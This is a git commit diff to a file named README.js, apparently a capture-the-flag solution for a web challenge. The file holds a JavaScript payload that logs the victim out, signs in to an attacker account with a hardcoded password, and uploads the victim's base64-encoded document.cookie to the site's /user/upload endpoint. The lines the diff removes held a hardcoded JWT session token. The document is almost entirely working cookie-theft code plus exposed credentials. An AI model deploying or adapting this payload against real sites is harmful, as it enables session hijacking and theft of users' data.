c06ed88c0cfc2cbc78bb9798455937e5e13f4db8
arang <jaewook376@naver.com>
2023-06-01 20:25:50 +0900

    Update README.js

--- README.js
+++ README.js
@@ -1,9 +1,17 @@
-fetch("/user/upload", {
+fetch("/user/logout").then(e=>{
+ fetch("/signin",{
+    method: "POST",
+    headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+    },
+     body: "uid=arang&upw=dkfkd3"
+    }).then(e=>{
+      fetch("/user/upload", {
   method: "POST",
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
-    "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjkyNywianRpIjoiMWQ4NTEyN2QtM2Y5Ny00NWNiLWFlNGUtZmY1ODIzNWQ1MDEzIiwibmJmIjoxNjg1NjE2OTI3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc4Mjd9.GPwFvuv1mL7H6MB3zbUG38CLjIUe0szON63bcVQSJzA"
   },
   body: "filename=asdf&data="+btoa(document.cookie),
-}).then(e=>e.text()).then(e=>{console.log(e)})
-  
+})
+})
+})
